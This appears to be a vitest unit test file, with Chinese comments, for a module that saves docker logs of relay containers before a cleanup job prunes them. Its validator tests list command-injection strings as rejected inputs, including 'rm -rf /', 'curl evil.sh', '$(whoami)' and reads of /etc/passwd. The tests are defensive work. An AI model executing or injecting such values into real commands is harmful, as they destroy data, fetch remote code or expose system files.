/**
 * relay-forensics 单测(TOP2 刀1 件③ — task f4f28298)
 *
 * 死因灭失的实证(2026-08-07):三个 relay 容器退出后,janitor.sh --mode frequent
 * 每 15 分钟一次无过滤 `docker container prune -f` 把它们连同 docker logs 一起收走
 * (prune 时刻 04:00:04 / 04:15:04 / 04:30:04 LA 与三次容器死亡一一对应),
 * 事后 forensic 归零,只能靠 exit code 猜死因。
 *
 * 药:容器回调到达的那一刻(容器还没退出)就把 docker logs 落到宿主可见的持久目录。
 */
import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { mkdtempSync, rmSync, readFileSync, existsSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import {
  captureRelayContainerLogs,
  relayForensicDir,
  isSafeContainerName,
} from '../relay-forensics.js';

let dir;
beforeEach(() => { dir = mkdtempSync(path.join(tmpdir(), 'relay-forensics-')); });
afterEach(() => { rmSync(dir, { recursive: true, force: true }); });

describe('isSafeContainerName', () => {
  it('放行 docker 合法容器名', () => {
    expect(isSafeContainerName('cecelia-relay-0b7df1ca-a66c5f93')).toBe(true);
  });

  it('拦截命令注入形状(containerId 来自 HTTP 路由参数,会进 shell)', () => {
    for (const evil of [
      'cecelia-relay-x; rm -rf /',
      'cecelia-relay-x && curl evil.sh',
      'cecelia-relay-x$(whoami)',
      'cecelia-relay-x`id`',
      'cecelia-relay-x|cat /etc/passwd',
      '../../etc/passwd',
      '',
    ]) {
      expect(isSafeContainerName(evil)).toBe(false);
    }
  });
});

describe('relayForensicDir', () => {
  it('默认落在 prompt 目录下(compose 已把它 bind-mount 到宿主,不随容器重建蒸发)', () => {
    expect(relayForensicDir({})).toBe('/tmp/cecelia-prompts/relay-forensics');
  });

  it('可被 CECELIA_RELAY_FORENSIC_DIR 覆盖', () => {
    expect(relayForensicDir({ CECELIA_RELAY_FORENSIC_DIR: '/x/y' })).toBe('/x/y');
  });
});

describe('captureRelayContainerLogs', () => {
  const containerId = 'cecelia-relay-0b7df1ca-a66c5f93';

  it('把 docker logs 落盘到 <dir>/<containerId>.log', () => {
    const execFn = vi.fn(() => 'line-1\nline-2\n');
    const r = captureRelayContainerLogs({ containerId, execFn, dir });
    expect(r.ok).toBe(true);
    expect(r.path).toBe(path.join(dir, `${containerId}.log`));
    expect(readFileSync(r.path, 'utf8')).toContain('line-1');
    // 必须带 --tail 限幅 + 合并 stderr(死因常只在 stderr)
    const cmd = execFn.mock.calls[0][0];
    expect(cmd).toContain('docker logs');
    expect(cmd).toContain('--tail');
    expect(cmd).toContain(containerId);
  });

  it('容器名不安全 → 拒绝执行任何命令(不给注入机会)', () => {
    const execFn = vi.fn(() => 'x');
    const r = captureRelayContainerLogs({ containerId: 'evil; rm -rf /', execFn, dir });
    expect(r.ok).toBe(false);
    expect(r.reason).toBe('unsafe_container_name');
    expect(execFn).not.toHaveBeenCalled();
  });

  it('docker 报错(容器已被 prune) → 不抛,返回 ok=false', () => {
    const execFn = vi.fn(() => { throw new Error('No such container'); });
    const r = captureRelayContainerLogs({ containerId, execFn, dir });
    expect(r.ok).toBe(false);
    expect(r.reason).toContain('No such container');
  });

  it('日志为空 → 不落空文件(避免制造无信息的噪音文件)', () => {
    const execFn = vi.fn(() => '   ');
    const r = captureRelayContainerLogs({ containerId, execFn, dir });
    expect(r.ok).toBe(false);
    expect(r.reason).toBe('empty_logs');
    expect(existsSync(path.join(dir, `${containerId}.log`))).toBe(false);
  });

  it('目录不可写 → 不抛(forensic 是尽力而为,绝不能拖累回调 ack)', () => {
    const execFn = vi.fn(() => 'data');
    const r = captureRelayContainerLogs({
      containerId, execFn, dir: '/proc/nonexistent-forensic-dir',
    });
    expect(r.ok).toBe(false);
  });
});
